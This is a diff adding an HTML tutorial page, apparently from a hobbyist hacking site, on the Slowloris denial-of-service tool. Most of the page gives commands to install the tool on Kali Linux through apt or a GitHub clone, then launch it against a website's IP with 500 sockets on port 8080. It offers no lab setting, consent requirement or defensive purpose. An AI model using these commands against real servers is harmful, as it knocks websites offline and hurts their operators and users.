@@ -1,0 +1,67 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slowloris</title>
+    <style>
+        body{background-color: antiquewhite;
+        text-align: center;}
+        h1{color: blue;font-size: 45px;text-align: center;}
+        h2{color: red;font-size: 35px;text-align: center;}
+        p{color: green;font-size: 35px;text-align: center;font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;}
+        .hp{font-size: 50px;text-align: center;font-family: 'Courier New', Courier, monospace;color: brown;}
+        b{font-size: 40px;text-align: center;font-family: 'Courier New', Courier, monospace;color: red;}
+        u{font-size: 50px;text-align: center;font-family: 'Courier New', Courier, monospace;color: rebeccapurple;}
+        i{font-size: 40px;text-align: center;font-family: 'Courier New', Courier, monospace;color: orange;}
+       
+    </style>
+</head>
+<header><h1>Slowloris</h1></header>
+<p>
+<img src="data:image/png;base64,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" alt="" width="400" height="400"> 
+
+    <b><br>requirements : <br>
+  <br>Kali Linux <br>
+  <br>Steps <br></b>
+
+ <i> <br> there are 2 ways to install <br>
+  <br> 1st <br></i>
+  <br>sudo bash<br>
+ <br> apt install slowloris<br>
+  <br>slowloris -h <br>
+  <br>to attack first we need ip of the website <br>
+  <br>slowloris 192.168.1.1 -s 500 -p 8080 ( replace your ip here )<br>
+ <u> <br>-s sockets -p port <br></u>
+ <i> <br>2nd : <br></i>
+
+
+  <br>git clone https://github.com/gkbrk/slowloris.git<br>
+  <br>cd slowloris<br>
+  <br>python3 slowloris.py 192.168.1.1 -s 500 -p 8080<br>
+  <br>or you can take website in place of ip <br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </p>
+
+    <a href="hackingfulldetails.html" class="hp">BACK TO HOMEPAGE</a>
+</body>
+</html>
